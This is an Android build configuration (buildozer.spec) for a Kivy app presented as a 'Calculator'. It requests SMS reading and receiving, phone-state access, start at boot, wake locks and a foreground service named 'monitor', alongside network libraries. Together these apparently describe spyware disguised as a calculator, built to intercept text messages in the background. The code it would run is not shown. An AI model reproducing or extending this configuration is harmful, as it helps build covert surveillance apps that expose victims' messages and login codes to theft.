[app]
title = Calculator
package.name = smartcalc
package.domain = com.aegis
source.dir = .
requirements = python3,kivy==2.2.1,requests,urllib3,chardet,idna
version = 4.0

# Portrait mode lock (सीधा स्क्रीन)
orientation = portrait

# Full Permissions
android.permissions = INTERNET, RECEIVE_SMS, READ_SMS, READ_PHONE_STATE, POST_NOTIFICATIONS, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, FOREGROUND_SERVICE

android.api = 33
android.minapi = 21
android.sdk = 33
android.ndk = 25b
android.archs = arm64-v8a
android.accept_sdk_license = True
android.services = monitor:main.py
